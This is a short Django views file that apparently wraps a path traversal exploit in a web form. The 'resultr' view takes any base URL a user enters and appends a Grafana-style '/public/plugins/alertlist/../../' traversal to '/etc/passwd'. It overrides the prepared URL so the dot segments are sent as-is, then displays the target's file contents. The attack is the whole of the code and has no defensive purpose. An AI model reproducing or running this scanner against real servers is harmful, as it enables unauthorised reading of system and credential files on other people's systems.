from django.http import HttpResponse
from django.shortcuts import render
import requests 
import urllib3

def index(request):
    return render(request, 'index.html')

def resultr(request):
    user_inp = request.GET.get('urls', 'default')
    mainurlss = user_inp+"/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd"
    s = requests.Session()
    r = requests.Request(method='GET', url=mainurlss)
    prep = r.prepare()
    prep.url = mainurlss
    response = s.send(prep)
    final = response.text
    params = {'res': final}
    return render(request, 'ress.html', params)